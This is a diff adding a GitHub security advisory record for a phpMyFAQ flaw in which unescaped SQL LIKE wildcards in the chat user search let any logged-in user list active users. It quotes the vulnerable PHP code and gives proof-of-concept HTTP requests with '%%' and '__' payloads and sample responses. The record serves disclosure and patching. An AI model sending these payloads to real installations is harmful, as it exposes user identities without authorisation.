@@ -1,0 +1,63 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6pvm-2vjj-rx4w",
+  "modified": "2026-08-12T15:17:54Z",
+  "published": "2026-08-12T15:17:54Z",
+  "aliases": [
+    "CVE-2026-47132"
+  ],
+  "summary": "phpMyFAQ: SQL LIKE Wildcard Injection in Chat User Search Allows Authenticated User Enumeration",
+  "details": "### Summary\n\n  An authenticated SQL LIKE wildcard injection vulnerability in phpMyFAQ’s chat user search allows any logged-in user to bypass the intended display-name search  filter and enumerate active users. The endpoint escapes SQL string syntax but does not escape `%` and `_`, which remain active `LIKE` wildcards.\n\n  ### Details\n\n  The vulnerable endpoint is:\n```\n  GET /api/chat/users?q=...\n```\n  Source:\n```php\n  // phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/ChatController.php\n  $query = trim($request->query->get('q', ''));\n\n  if (mb_strlen($query) < 2) {\n      return $this->json([\n          'success' => true,\n          'users' => [],\n      ], Response::HTTP_OK);\n  }\n\n  $chat = new Chat($this->configuration);\n  $users = $chat->searchUsers($query, $this->currentUser->getUserId());\n```\n  Sink:\n```php\n  // phpmyfaq/src/phpMyFAQ/Chat.php\n  $escapedTerm = $this->configuration->getDb()->escape(mb_strtolower($searchTerm));\n\n  $query = sprintf(\n      \"SELECT u.user_id, ud.display_name\n       FROM %sfaquser u\n       LEFT JOIN %sfaquserdata ud ON u.user_id = ud.user_id\n       WHERE u.user_id != %d\n         AND u.user_id > 0\n         AND LOWER(ud.display_name) LIKE '%%%s%%'\n         AND u.account_status = 'active'\n       LIMIT %d\",\n      Database::getTablePrefix(),\n      Database::getTablePrefix(),\n      $excludeUserId,\n      $escapedTerm,\n      $limit,\n  );\n```\n  `escape()` prevents SQL string breakout, but it does not escape SQL `LIKE` metacharacters. Therefore, attacker-controlled `%` and `_` are interpreted by the database as wildcards.\n\n  The project already uses a safer pattern elsewhere with ESCAPE '|' and wildcard escaping, but this chat search path does not apply it.\n\n  ### PoC: \n\n  Tested against:\n\n  phpMyFAQ 4.2.0-alpha\n  commit c0b7158df4bfb11d57b1ef7d471760583c9c2fae\n\n  Prerequisite: attacker has any valid authenticated user account.\n\n  1. Ensure there are multiple active users in the database, for example:\n```\n  userId=2 displayName=\"Alice Finance\"\n  userId=3 displayName=\"Bob Support\"\n  userId=4 displayName=\"Carol Engineering\"\n```\n  2. Send a normal query that should not match any user:\n```\n  GET /api/chat/users?q=zz HTTP/1.1\n  Host: target\n  Cookie: [authenticated session]\n```\n  Observed response:\n```\n  {\n    \"success\": true,\n    \"users\": []\n  }\n```\n  3. Send a wildcard query:\n```\n  GET /api/chat/users?q=%25%25 HTTP/1.1\n  Host: target\n  Cookie: [authenticated session]\n```\n  Observed response:\n```\n  {\n    \"success\": true,\n    \"users\": [\n      {\n        \"userId\": 2,\n        \"displayName\": \"Alice Finance\"\n      },\n      {\n        \"userId\": 3,\n        \"displayName\": \"Bob Support\"\n      },\n      {\n        \"userId\": 4,\n        \"displayName\": \"Carol Engineering\"\n      }\n    ]\n  }\n```\n  The same issue is reproducible with `_` wildcards:\n```\n  GET /api/chat/users?q=__ HTTP/1.1\n  Host: target\n  Cookie: [authenticated session]\n```\n  Local confirmation was also performed by calling the vulnerable phpMyFAQ\\Chat::searchUsers() method directly with seeded users. q=zz returned no users, while `q=%%` and `q=__` returned active users.\n\n  ### Impact\n\n  This is a SQL LIKE wildcard injection / search filter bypass vulnerability. Any authenticated user can enumerate active user IDs and display names through the  chat user search endpoint. This may disclose internal user identities, staff names, department names, or other sensitive account information depending on deployment.\n\n### Video PoC:\n\nhttps://github.com/user-attachments/assets/b684893f-ccb1-42af-9568-50900793076f",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "thorsten/phpmyfaq"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.0-alpha"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-6pvm-2vjj-rx4w"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/thorsten/phpMyFAQ/commit/bd4b08b012234ccfcff07bfe6518062475b29e0a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/thorsten/phpMyFAQ"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20",
+      "CWE-200",
+      "CWE-89"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-08-12T15:17:54Z",
+    "nvd_published_at": null
+  }
+}
